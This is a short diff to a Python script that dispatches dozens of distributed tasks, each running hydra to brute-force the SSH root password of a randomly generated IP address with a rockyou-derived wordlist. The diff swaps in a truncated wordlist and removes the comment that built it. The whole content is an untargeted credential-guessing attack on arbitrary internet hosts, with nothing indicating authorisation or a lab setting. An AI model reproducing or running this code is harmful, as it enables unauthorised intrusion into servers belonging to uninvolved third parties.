@@ -12,7 +12,7 @@ def start_attack():
 	r = ResultSet([])
 	valor=0
 	while valor<40:
-		cmd = ["hydra", "-l", "root", "-P", "rockyou.txt", str(randomize_ip()), "ssh"]#, "-t", "4"]
+		cmd = ["hydra", "-l", "root", "-P", "rockyoufinal.txt", str(randomize_ip()), "ssh"]
 		r.add(task_hydra.delay(cmd))
 		valor = valor +1
 
@@ -31,9 +31,3 @@ def end_attacks():
 if __name__ == '__main__':
 	start_attack()
 	end_attacks()
-
-
-#############################
-#head -250000 rockyou.txt > rockyoufinal.txt
-
-
